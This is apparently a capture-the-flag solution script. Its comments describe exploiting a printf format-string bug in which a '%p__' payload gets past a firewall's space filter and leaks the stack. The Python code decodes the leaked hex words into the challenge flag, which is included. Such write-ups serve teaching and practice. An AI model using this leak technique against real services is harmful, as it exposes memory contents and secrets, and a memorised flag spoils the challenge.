## code is vulnerable for format string attack on printf function , on line number 93
## since there is an space check in firewall, we can not leak the stack just by sending %p %p %p ...
## to bypss the space we will send : python3 -c "print('%p__'*40 + '%p')" , we can send any number of 
## %p , since we need to leak entire stack and then figerout which hex bytes is our flag, 
## after sending 1 \n and our payload we will get the hex , and bychecking each hex , on 15th hex we can see pico,so we will take from their to next (nil)
from binascii import unhexlify
flag_hex = "0x6f636970__0x7b465443__0x306c5f49__0x345f7435__0x6d5f6c6c__0x306d5f79__0x5f79336e__0x32666331__0x30613130__0xff87007d__0xf7fd0af8__0xf7fa3440__0x17cd2100"
flag_hex_list = flag_hex.split('__')

#final_flag = b"".join([  unhexlify(hex[2:])[::-1] for hex in flag_hex_list ]).decode()
final_flag = b"".join(map(lambda hex: unhexlify(hex[2:])[::-1],flag_hex_list))
# print(list(flag_hex_list))
# final_flag = b""
# for hex in flag_hex_list:
# 	print(hex)
# 	print(unhexlify(hex))
# 	final_flag = final_flag + unhexlify(hex)
print(final_flag)

